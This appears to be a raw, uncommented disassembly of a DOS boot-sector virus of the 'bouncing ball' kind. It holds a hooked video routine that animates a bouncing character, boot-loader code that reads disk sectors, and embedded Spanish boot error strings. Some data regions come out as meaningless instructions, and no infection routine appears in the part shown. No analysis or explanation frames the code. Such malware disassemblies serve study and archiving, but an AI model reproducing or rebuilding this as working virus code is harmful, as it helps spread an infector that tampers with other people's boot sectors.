

		push	ds
		push	ax
		push	bx
		push	cx
		push	dx
		push	cs
		pop	ds
		mov	ah,0Fh
		int	10h			; Video display   ah=functn 0Fh
						;  get state, al=mode, bh=page
		mov	bl,al
		cmp	bx,word ptr ds:[7FD4h]	; (8F68:7FD4=0)
		je	loc_5			; Jump if equal
		mov	word ptr ds:[7FD4h],bx	; (8F68:7FD4=0)
		dec	ah
		mov	byte ptr ds:[7FD6h],ah	; (8F68:7FD6=0)
		mov	ah,1
		cmp	bl,7
		jne	loc_3			; Jump if not equal
		dec	ah
loc_3:
		cmp	bl,4
		jae	loc_4			; Jump if above or =
		dec	ah
loc_4:
		mov	byte ptr ds:[7FD3h],ah	; (8F68:7FD3=0)
		mov	word ptr ds:[7FCFh],101h	; (8F68:7FCF=0)
		mov	word ptr ds:[7FD1h],101h	; (8F68:7FD1=0)
		mov	ah,3
		int	10h			; Video display   ah=functn 03h
						;  get cursor loc in dx, mode cx
		push	dx
		mov	dx,word ptr ds:[7FCFh]	; (8F68:7FCF=0)
		jmp	short loc_7		; (014A)
loc_5:
		mov	ah,3
		int	10h			; Video display   ah=functn 03h
						;  get cursor loc in dx, mode cx
		push	dx
		mov	ah,2
		mov	dx,word ptr ds:[7FCFh]	; (8F68:7FCF=0)
		int	10h			; Video display   ah=functn 02h
						;  set cursor location in dx
		mov	ax,word ptr ds:[7FCDh]	; (8F68:7FCD=0)
		cmp	byte ptr ds:[7FD3h],1	; (8F68:7FD3=0)
		jne	loc_6			; Jump if not equal
		mov	ax,8307h
loc_6:
		mov	bl,ah
		mov	cx,1
		mov	ah,9
		int	10h			; Video display   ah=functn 09h
						;  set char al & attrib ah @curs
loc_7:
		mov	cx,word ptr ds:[7FD1h]	; (8F68:7FD1=0)
		cmp	dh,0
		jne	loc_8			; Jump if not equal
		xor	ch,0FFh
		inc	ch
loc_8:
		cmp	dh,18h
		jne	loc_9			; Jump if not equal
		xor	ch,0FFh
		inc	ch
loc_9:
		cmp	dl,0
		jne	loc_10			; Jump if not equal
		xor	cl,0FFh
		inc	cl
loc_10:
		cmp	dl,byte ptr ds:[7FD6h]	; (8F68:7FD6=0)
		jne	loc_11			; Jump if not equal
		xor	cl,0FFh
		inc	cl
loc_11:
		cmp	cx,word ptr ds:[7FD1h]	; (8F68:7FD1=0)
		jne	loc_13			; Jump if not equal
		mov	ax,word ptr ds:[7FCDh]	; (8F68:7FCD=0)
		and	al,7
		cmp	al,3
		jne	loc_12			; Jump if not equal
		xor	ch,0FFh
		inc	ch
loc_12:
		cmp	al,5
		jne	loc_13			; Jump if not equal
		xor	cl,0FFh
		inc	cl
loc_13:
		add	dl,cl
		add	dh,ch
		mov	word ptr ds:[7FD1h],cx	; (8F68:7FD1=0)
		mov	word ptr ds:[7FCFh],dx	; (8F68:7FCF=0)
		mov	ah,2
		int	10h			; Video display   ah=functn 02h
						;  set cursor location in dx
		mov	ah,8
		int	10h			; Video display   ah=functn 08h
						;  get char al & attrib ah @curs
		mov	word ptr ds:[7FCDh],ax	; (8F68:7FCD=0)
		mov	bl,ah
		cmp	byte ptr ds:[7FD3h],1	; (8F68:7FD3=0)
		jne	loc_14			; Jump if not equal
		mov	bl,83h
loc_14:
		mov	cx,1
		mov	ax,907h
		int	10h			; Video display   ah=functn 09h
						;  set char al & attrib ah @curs
		pop	dx
		mov	ah,2
		int	10h			; Video display   ah=functn 02h
						;  set cursor location in dx
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	ds
;*		jmp	far ptr loc_1		;*(0000:0020)
		db	0EAh, 20h, 0, 0, 0
		add	[bx+si],al
		add	[bx+di],ax
		add	[bx+di],ax
		add	bh,bh
		call	word ptr [bx+si-49h]
		mov	bh,0B7h
		mov	dh,40h			; '@'
		inc	ax
		mov	dh,bl
		out	5Ah,al			; port 5Ah
		lodsb				; String [si] to al
		shl	ah,cl			; Shift w/zeros fill
;*		jmp	far ptr loc_40		;*(EC50:40E6)
		db	0EAh, 0E6h, 40h, 50h, 0ECh
		inc	ax
		db	64h
		pop	sp
		db	60h
		push	dx
		inc	ax
		inc	ax
		inc	ax
		inc	ax
		db	64h
		db	62h
		pop	si
		db	62h
		db	60h
		pop	si
;*		jo	loc_18			;*Jump if overflow=1
		db	70h, 6Eh
		inc	ax
		inc	cx
		mov	bh,0B7h
		mov	bh,0B6h
		jmp	short loc_15		; (0236)
		nop
		dec	cx
		inc	dx
		dec	bp
		and	[bx+si],ah
		xor	bp,word ptr ds:[32h]	; (0000:0032=70h)
		add	al,[bp+si]
		add	[bx+si],ax
		add	dh,[bx+si+0]
		rol	byte ptr [bp+si],1	; Rotate
		std				; Set direction flag
		add	al,[bx+si]
		or	[bx+si],ax
		add	al,[bx+si]
		db	19 dup (0)
		db	0Fh
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],ax
loc_15:
		cli				; Disable interrupts
		xor	ax,ax			; Zero register
		mov	ss,ax
		mov	sp,7C00h
		push	ss
		pop	es
		mov	bx,78h
		lds	si,dword ptr ss:[bx]	; Load 32 bit ptr
		push	ds
		push	si
		push	ss
		push	bx
		mov	di,7C2Bh
		mov	cx,0Bh
		cld				; Clear direction
  
locloop_16:
		lodsb				; String [si] to al
		cmp	byte ptr es:[di],0
		je	loc_17			; Jump if equal
		mov	al,es:[di]
loc_17:
		stosb				; Store al to es:[di]
		mov	al,ah
		loop	locloop_16		; Loop if cx > 0
  
		push	es
		pop	ds
		mov	[bx+2],ax
		mov	word ptr [bx],7C2Bh
		sti				; Enable interrupts
		int	13h			; Disk  dl=drive b: ah=func 00h
						;  reset disk, al=return status
		jc	loc_21			; Jump if carry Set
		mov	al,byte ptr ds:[7C10h]	; (8F68:7C10=0)
		cbw				; Convrt byte to word
		mul	word ptr ds:[7C16h]	; (8F68:7C16=0) ax = data * ax
		add	ax,word ptr ds:[7C1Ch]	; (8F68:7C1C=0)
		add	ax,word ptr ds:[7C0Eh]	; (8F68:7C0E=0)
		mov	word ptr ds:[7C3Fh],ax	; (8F68:7C3F=0)
		mov	word ptr ds:[7C37h],ax	; (8F68:7C37=0)
		mov	ax,20h
		mul	word ptr ds:[7C11h]	; (8F68:7C11=0) ax = data * ax
		mov	bx,word ptr ds:[7C0Bh]	; (8F68:7C0B=0)
		add	ax,bx
		dec	ax
		div	bx			; ax,dx rem=dx:ax/reg
		add	word ptr ds:[7C37h],ax	; (8F68:7C37=0)
		mov	bx,500h
		mov	ax,word ptr ds:[7C3Fh]	; (8F68:7C3F=0)
		call	sub_2			; (0337)
		mov	ax,201h
		call	sub_3			; (0351)
		jc	loc_19			; Jump if carry Set
		mov	di,bx
		mov	cx,0Bh
		mov	si,7DCFh
		repe	cmpsb			; Rept zf=1+cx>0 Cmp [si] to es:[di]
		jnz	loc_19			; Jump if not zero
		lea	di,[bx+20h]		; Load effective addr
		mov	si,7DDAh
		mov	cx,0Bh
		repe	cmpsb			; Rept zf=1+cx>0 Cmp [si] to es:[di]
		jz	loc_22			; Jump if zero
loc_19:
		mov	si,7D6Eh
loc_20:
		call	sub_1			; (0329)
		xor	ah,ah			; Zero register
		int	16h			; Keyboard i/o  ah=function 00h
						;  get keybd char in al, ah=scan
		pop	si
		pop	ds
		pop	word ptr [si]
		pop	word ptr [si+2]
		int	19h			; Bootstrap loader
loc_21:
		mov	si,7DB9h
		jmp	short loc_20		; (02C5)
loc_22:
		mov	ax,word ptr ds:[51Ch]	; (8F68:051C=0)
		xor	dx,dx			; Zero register
		div	word ptr ds:[7C0Bh]	; (8F68:7C0B=0) ax,dxrem=dx:ax/data
		inc	al
		mov	byte ptr ds:[7C3Ch],al	; (8F68:7C3C=0)
		mov	ax,word ptr ds:[7C37h]	; (8F68:7C37=0)
		mov	word ptr ds:[7C3Dh],ax	; (8F68:7C3D=0)
		mov	bx,700h
loc_23:
		mov	ax,word ptr ds:[7C37h]	; (8F68:7C37=0)
		call	sub_2			; (0337)
		mov	ax,word ptr ds:[7C18h]	; (8F68:7C18=0)
		sub	al,byte ptr ds:[7C3Bh]	; (8F68:7C3B=0)
		inc	ax
		push	ax
		call	sub_3			; (0351)
		pop	ax
		jc	loc_21			; Jump if carry Set
		sub	byte ptr ds:[7C3Ch],al	; (8F68:7C3C=0)
		jbe	loc_24			; Jump if below or =
		add	word ptr ds:[7C37h],ax	; (8F68:7C37=0)
		mul	word ptr ds:[7C0Bh]	; (8F68:7C0B=0) ax = data * ax
		add	bx,ax
		jmp	short loc_23		; (02F1)
loc_24:
		mov	ch,byte ptr ds:[7C15h]	; (8F68:7C15=0)
		mov	dl,byte ptr ds:[7DFDh]	; (8F68:7DFD=0)
		mov	bx,word ptr ds:[7C3Dh]	; (8F68:7C3D=0)
;*		jmp	far ptr loc_2		;*(0070:0000)
		db	0EAh, 0, 0, 70h, 0
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near
loc_25:
		lodsb				; String [si] to al
		or	al,al			; Zero ?
		jz	loc_ret_26		; Jump if zero
		mov	ah,0Eh
		mov	bx,7
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		jmp	short loc_25		; (0329)
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_2:
		xor	dx,dx			; Zero register
		div	word ptr ds:[7C18h]	; (8F68:7C18=0) ax,dxrem=dx:ax/data
		inc	dl
		mov	byte ptr ds:[7C3Bh],dl	; (8F68:7C3B=0)
		xor	dx,dx			; Zero register
		div	word ptr ds:[7C1Ah]	; (8F68:7C1A=0) ax,dxrem=dx:ax/data
		mov	byte ptr ds:[7C2Ah],dl	; (8F68:7C2A=0)
		mov	word ptr ds:[7C39h],ax	; (8F68:7C39=0)
  
loc_ret_26:
		retn
sub_1		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_3		proc	near
		mov	ah,2
		mov	dx,word ptr ds:[7C39h]	; (8F68:7C39=0)
		mov	cl,6
		shl	dh,cl			; Shift w/zeros fill
		or	dh,byte ptr ds:[7C3Bh]	; (8F68:7C3B=0)
		mov	cx,dx
		xchg	ch,cl
		mov	dl,byte ptr ds:[7DFDh]	; (8F68:7DFD=0)
		mov	dh,byte ptr ds:[7C2Ah]	; (8F68:7C2A=0)
		int	13h			; Disk  dl=drive a: ah=func 02h
						;  read sectors to memory es:bx
		retn
sub_3		endp
  
		or	ax,450Ah
;*		jc	loc_41			;*Jump if carry Set
		db	72h, 72h
		db	6Fh
;*		jc	loc_27			;*Jump if carry Set
		db	72h, 20h
		db	65h
		db	6Eh
;*		and	byte ptr ds:[69h][si],ah	; (8F68:0069=97h)
		db	20h, 64h, 69h		; Fixup for MASM (Z)
;*		jnc	loc_30			;*Jump if carry=0
		db	73h, 6Bh
		db	65h
;*		jz	loc_32			;*Jump if zero
		db	74h, 74h
		db	65h
		and	[bx+20h],ch
		db	64h
		db	69h
;*		jnc	loc_31			;*Jump if carry=0
		db	73h, 6Bh
		db	65h
		jz	loc_33			; Jump if zero
		db	65h
;*		and	byte ptr ss:[69h][bp+di],dh	; (8F68:0069=97h)
		db	20h, 73h, 69h		; Fixup for MASM (Z)
		db	6Eh
		and	[si+4Fh],al
		push	bx
		or	ax,430Ah
		mov	al,byte ptr ds:[626Dh]	; (8F68:626D=0)
		db	69h
		db	65h
		db	6Ch
		db	6Fh
		and	[bx+di+20h],bh
;*		jo	loc_35			;*Jump if overflow=1
		db	70h, 75h
		db	6Ch
;*		jnc	loc_34			;*Jump if carry=0
		db	73h, 65h
;*		and	byte ptr ss:[75h][bp+di],ah	; (8F68:0075=2Dh)
		db	20h, 63h, 75h		; Fixup for MASM (Z)
		db	61h
		db	6Ch
;*		jno	loc_36			;*Jump if not overflw
		db	71h, 75h
		db	69h
		db	65h
		jc	loc_28			; Jump if carry Set
;*		jz	loc_35			;*Jump if zero
		db	74h, 65h
		db	63h
		db	6Ch
		db	61h
		or	ax,0Ah
		or	ax,450Ah
;*		jc	loc_38			;*Jump if carry Set
		db	72h, 72h
		db	6Fh
;*		jc	loc_29			;*Jump if carry Set
		db	72h, 20h
		db	65h
		db	6Eh
;*		and	byte ptr ds:[72h][bx+di],ah	; (8F68:0072=0FEh)
		db	20h, 61h, 72h		; Fixup for MASM (Z)
;*		jc	loc_37			;*Jump if carry Set
		db	72h, 61h
		db	6Eh
;*		jno	loc_39			;*Jump if not overflw
		db	71h, 75h
		db	65h
		or	ax,0Ah
		dec	cx
		inc	dx
loc_28:
		dec	bp
		inc	dx
		dec	cx
		dec	di
		and	[bx+si],ah
		inc	bx
		dec	di
		dec	bp
		dec	cx
		inc	dx
		dec	bp
		inc	sp
		dec	di
		push	bx
		and	[bx+si],ah
		inc	bx
		dec	di
		dec	bp
loc_41:
		db	25 dup (0)
		push	bp
loc_33:
		stosb				; Store al to es:[di]
  

